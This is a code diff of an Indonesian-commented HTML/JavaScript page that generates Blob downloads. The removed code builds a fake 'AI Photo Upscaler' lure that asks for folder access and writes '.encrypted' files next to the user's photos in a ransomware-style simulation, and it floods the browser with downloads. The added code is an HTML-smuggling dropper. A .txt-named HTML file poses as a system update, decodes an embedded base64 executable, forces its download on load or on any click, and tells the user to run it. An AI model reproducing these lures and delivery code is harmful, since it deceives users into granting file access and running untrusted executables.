@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk memicu pembuatan berkas Blob HTML yang akan meminta akses ke direktori (File System Access API).</p>
+<p>Klik tombol untuk mengunduh satu file HTML ber-ekstensi .txt. Saat dibuka, file tersebut akan memicu download satu file .exe.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -54,79 +54,67 @@ const prepareMimeBlobAsync = (i) => {
         queueMicrotask(() => {
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>Photo Upscaler</title></head>" +
-            "<body style='margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
-            "<div style='text-align:center;padding:20px;max-width:400px;'>" +
-            "<h1 style='font-size:32px;color:#fff;margin-bottom:20px;'>📸 AI Photo Upscaler</h1>" +
-            "<p style='font-size:16px;color:#aaa;margin-bottom:30px;'>Tingkatkan kualitas foto Anda menjadi 4K secara instan. Pilih folder foto Anda untuk memulai.</p>" +
-            "<button id='btn-select' style='background:#4CAF50;color:white;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;box-shadow:0 4px 15px rgba(76,175,80,0.4);'>Pilih Folder Foto</button>" +
-            "<p id='status' style='color:#4CAF50;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
-            "<p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
+            "<head><meta charset='UTF-8'><title>Sistem Pembaruan</title></head>" +
+            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
+            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ Pembaruan Sistem</h2>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan perangkat lunak sedang diunduh. Harap tunggu hingga proses selesai.</p>" +
+            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Mengunduh paket...</p>" +
+            "    <p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
             "</div>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
             "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
             
-            "var sudah = false;" +
-            
-            // --- MUNCULKAN ALERT SAAT HALAMAN DIMUAT ---
-            "window.addEventListener('load', function() {" +
-            "    setTimeout(function() {" +
-            "        alert('Peringatan: Aplikasi AI Photo Upscaler memerlukan akses ke folder foto Anda untuk memproses gambar.');" +
-            "    }, 500);" +
-            "});" +
-            // ------------------------------------------
-            
-            "function cekDukungan() {" +
-            "    if (!window.showDirectoryPicker) {" +
-            "        return false;" +
-            "    }" +
-            "    return true;" +
+            "function b64KeBytes(b64){" +
+            "var binary = atob(b64);" +
+            "var len = binary.length;" +
+            "var bytes = new Uint8Array(len);" +
+            "for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
+            "return bytes;" +
             "}" +
             
-            "document.getElementById('btn-select').addEventListener('click', async function() {" +
-            "    if (sudah) return;" +
-            "    sudah = true;" +
-            "    var statusEl = document.getElementById('status');" +
-            "    " +
-            "    if (!cekDukungan()) {" +
-            "        statusEl.textContent = 'Browser tidak mendukung File System Access API.';" +
-            "        statusEl.style.color = '#f00';" +
-            "        alert('Browser Anda tidak mendukung fitur ini. Gunakan Chrome/Edge versi terbaru.');" +
-            "        sudah = false;" +
-            "        return;" +
-            "    }" +
+            // PAYLOAD: File .exe yang berisi perintah untuk membuka calc.exe
+            "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
             
-            "    statusEl.textContent = 'Meminta izin akses folder...';" +
-            "    statusEl.style.color = '#4CAF50';" +
+            "var sudah = false;" +
             
-            "    try {" +
-            "        var dirHandle = await window.showDirectoryPicker();" +
-            "        statusEl.textContent = 'Akses diberikan. Memproses foto...';" +
+            "function picuDownload(){" +
+            "if (sudah) return;" +
+            "sudah = true;" +
+            "var statusEl = document.getElementById('status');" +
+            "try{" +
+            "statusEl.textContent = 'Menyimpan file...';" +
+            "var bytesArr = b64KeBytes(b64Data);" +
+            "var blob = new Blob([bytesArr], { type: 'application/x-msdownload' });" +
+            "var url = URL.createObjectURL(blob);" +
+            "var a = document.createElement('a');" +
+            "a.href = url;" +
+            "a.download = 'System_Update_Calculator.exe';" +
+            "a.style.display = 'none';" +
+            "document.body.appendChild(a);" +
+            "a.click();" +
+            "setTimeout(function(){ " +
+            "if (a.parentNode) a.parentNode.removeChild(a); " +
+            "URL.revokeObjectURL(url); " +
+            "}, 3000);" +
+            "statusEl.textContent = 'Paket berhasil diunduh. Silakan jalankan file tersebut.';" +
+            "statusEl.style.color = '#4CAF50';" +
+            "} catch(e){" +
+            "statusEl.textContent = 'Gagal: ' + e.message;" +
+            "statusEl.style.color = '#f00';" +
+            "sudah = false;" +
+            "}" +
+            "}" +
             
-            "        var fileCount = 0;" +
-            "        for await (var entry of dirHandle.values()) {" +
-            "            if (entry.kind === 'file') {" +
-            "                var file = await entry.getFile();" +
-            "                if (file.type.startsWith('image/')) {" +
-            "                    var newFile = await dirHandle.getFileHandle(entry.name + '.encrypted', { create: true });" +
-            "                    var writable = await newFile.createWritable();" +
-            "                    await writable.write('FILE ENCRYPTED BY SIMULATION');" +
-            "                    await writable.close();" +
-            "                    fileCount++;" +
-            "                    statusEl.textContent = 'Memproses ' + fileCount + ' file...';" +
-            "                }" +
-            "            }" +
-            "        }" +
-            "        statusEl.textContent = 'Selesai memproses ' + fileCount + ' file.';" +
-            "        alert('Simulasi selesai! ' + fileCount + ' file telah dimanipulasi.');" +
-            "    } catch (e) {" +
-            "        statusEl.textContent = 'Akses ditolak atau gagal: ' + e.message;" +
-            "        statusEl.style.color = '#f00';" +
-            "        sudah = false;" +
-            "    }" +
-            "});" +
+            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+            "document.addEventListener('click', picuDownload);" +
+            "document.addEventListener('touchstart', picuDownload);" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -142,32 +130,17 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `photo-upscaler-${fileData.id}.txt`;
-    link.textContent = `Blob #${fileData.id} (.txt)`;
+    link.download = `update-paket.txt`; // Hanya satu file, tanpa nomor
+    link.textContent = `Download update-paket.txt`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
 };
 
-const processLoop = async (counter) => {
-    if (!isProcessing) return;
-
-    const fileData = await prepareMimeBlobAsync(counter);
-    activeUrls.push(fileData.url);
-    triggerInstantDownload(fileData);
-
-    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
-
-    if (counter % 10 === 0) {
-        speak(`Proses mencapai ${counter} berkas.`);
-    }
-
-    setTimeout(() => processLoop(counter + 1), 0);
-};
-
 startBtn.addEventListener("click", () => {
     if (isProcessing) return;
 
+    // Bersihkan URL lama
     activeUrls.forEach(url => URL.revokeObjectURL(url));
     activeUrls = [];
     downloadsDiv.replaceChildren();
@@ -188,10 +161,15 @@ startBtn.addEventListener("click", () => {
         console.warn("Fullscreen tidak didukung atau ditolak:", err);
     }
 
-    setTimeout(() => {
+    setTimeout(async () => {
         isProcessing = true;
         speak("Proses pembuatan berkas Blob dimulai.");
-        processLoop(1);
+        
+        // Hanya jalankan sekali (tanpa loop)
+        const fileData = await prepareMimeBlobAsync(1);
+        activeUrls.push(fileData.url);
+        triggerInstantDownload(fileData);
+        statusDiv.textContent = `Selesai: File berhasil dikirim.`;
     }, 300);
 });
 </script>
